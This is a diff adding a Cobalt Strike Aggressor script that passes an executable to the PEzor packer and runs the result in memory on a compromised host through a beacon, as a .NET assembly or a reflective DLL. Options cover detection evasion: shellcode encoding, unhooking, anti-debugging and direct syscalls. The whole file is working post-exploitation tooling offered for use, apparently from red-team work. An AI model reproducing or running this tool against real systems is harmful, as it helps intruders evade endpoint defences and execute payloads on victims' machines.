@@ -1,0 +1,219 @@
+import java.util.UUID;
+
+alias execute-inmemory {
+    fork(&execute_inmemory, $beacon => $1, $command => $0);
+}
+
+sub execute_inmemory {
+    debug(34);
+
+    # manually parse args
+    find($command, ' ([\w\/\.]*)')
+    ($match, $type) = matched();
+    $executable = copy($match);
+
+    find($command, '(\-sgn)');
+    ($match, $type) = matched();
+    $sgn = copy($match);
+
+    find($command, '(\-rx)');
+    ($match, $type) = matched();
+    $rx = copy($match);
+
+    find($command, '(\-self)');
+    ($match, $type) = matched();
+    $self = copy($match);
+
+    find($command, '(\-sdk)');
+    ($match, $type) = matched();
+    $sdk = copy($match);
+
+    find($command, '(\-debug)');
+    ($match, $type) = matched();
+    $debug = copy($match);
+
+    find($command, '(\-32)');
+    ($match, $type) = matched();
+    $32 = copy($match);
+
+    find($command, '(\-64)');
+    ($match, $type) = matched();
+    $64 = copy($match);
+
+    find($command, '(\-unhook)');
+    ($match, $type) = matched();
+    $unhook = copy($match);
+
+    find($command, '(\-antidebug)');
+    ($match, $type) = matched();
+    $antidebug = copy($match);
+
+    find($command, '(\-syscalls)');
+    ($match, $type) = matched();
+    $syscalls = copy($match);
+
+    find($command, '\-sleep=(\d*)');
+    ($match, $type) = matched();
+    $sleep = copy($match);
+
+    find($command, '\-wait=(\d*)');
+    ($match, $type) = matched();
+    $wait = copy($match);
+
+    find($command, '\-format=([\w\-]*)');
+    ($match, $type) = matched();
+    $format = copy($match);
+
+    $index = indexOf($command, $executable);
+    $length = strlen($executable);
+    $end = expr("$index + $length + 1");
+    $opts = substr($command, $end);
+
+    find($opts, "\-p '(.*)'");
+    ($match, $type) = matched();
+    $args = copy($match);
+
+    $otherops = replace($opts, "\-p ' $+ $args $+ '", "");
+
+    # validation
+    if (($format ne "") && ("dotnet" !isin $format) && ($format ne "reflective-dll")) {
+        berror($beacon, "Format $format is not supported, use -format=reflective-dll or -format=dotnet");
+        return;
+    }
+
+    if ($wait eq "") {
+        $wait = 0;
+    }
+
+    if ($format eq "") {
+        $format = "dotnet";
+    }
+
+    # announce task
+    btask($beacon, "Tasked beacon to execute in-memory $executable with args: $args");
+
+    # copy executable to tmp dir
+    $random = [java.util.UUID randomUUID];
+    $uuid = [$random toString];
+    $tmpdir = "/tmp/";
+    $tmpfile = copy($executable);
+    $tmpfile = replace($tmpfile, '\/', "_");
+    $tmpfile = "$uuid $+ $tmpfile";
+    $tmpdest = "$tmpdir $+ $tmpfile";
+    println("Copying $executable to $tmpdest");
+    copy_file($executable, $tmpdest);
+    println("Copied $executable to $tmpdest");
+
+    # build argv
+    push(@argv, "PEzor");
+
+    if ($sgn ne "") {
+        push(@argv, $sgn);
+    }
+
+    if ($rx ne "") {
+        push(@argv, $rx);
+    }
+
+    if ($self ne "") {
+        push(@argv, $self);
+    }
+
+    if ($sdk ne "") {
+        push(@argv, $sdk);
+    }
+
+    if ($debug ne "") {
+        push(@argv, $debug);
+    }
+
+    if ($32 ne "") {
+        push(@argv, $32);
+    }
+
+    if ($64 ne "") {
+        push(@argv, $64);
+    }
+
+    if ($unhook ne "") {
+        push(@argv, $unhook);
+    }
+
+    if ($antidebug ne "") {
+        push(@argv, $antidebug);
+    }
+
+    if ($syscalls ne "") {
+        push(@argv, $syscalls);
+    }
+
+    if ($sleep ne "") {
+        push(@argv, "-sleep= $+ $sleep");
+    }
+
+    if ($format ne "") {
+        push(@argv, "-format= $+ $format");
+    }
+
+    push(@argv, $tmpdest);
+
+    if ($args ne "") {
+        push(@argv, "-p");
+        push(@argv, $args);
+    }
+
+    push(@argv, $otherops);
+
+    #printAll(@argv);
+
+    if ("dotnet" isin $format) {
+        $extension = ".packed.dotnet.exe";
+    } else {
+        $extension = ".reflective.dll";
+    }
+
+    # execute PEzor
+    println("Executing PEzor");
+    $handle = fork(&exec_async, \@argv);
+    @output = wait($handle);
+    closef($handle);
+    printAll(@output);
+
+    if ("dotnet" isin $format) {
+        $packed = "$tmpdest $+ .packed.dotnet.exe";
+        blog($beacon, "PEzor generated .NET assembly $packed");
+        println("Executing generated .NET assembly: $packed");
+
+        # call execute-assembly
+        bexecute_assembly($beacon, $packed);
+    } else {
+        $packed = "$tmpdest $+ .packed.reflective.dll";
+        blog($beacon, "PEzor generated reflective DLL $packed");
+        println("Executing generated reflective DLL: $packed");
+        bdllspawn($beacon, $packed, $null, "Reflective DLL: $executable", expr("$wait * 1000"), true);
+    }
+
+    # cleanup
+    #deleteFile($tmpdest);
+    #deleteFile(packed);
+}
+
+sub exec_async {
+    $handle = exec(@argv, $null);
+    @output = readAll($handle);
+    if (checkError($error)) {
+        warn("Could not execute @argv[0] $+ : $error");
+    }
+    closef($handle);
+    return @output;
+}
+
+sub copy_file {
+    $handle = openf($1);
+    $data = readb($handle, -1);
+    closef($handle);
+    $handle = openf("> $+ $2");
+    writeb($handle, $data);
+    wait($handle);
+    closef($handle);
+}
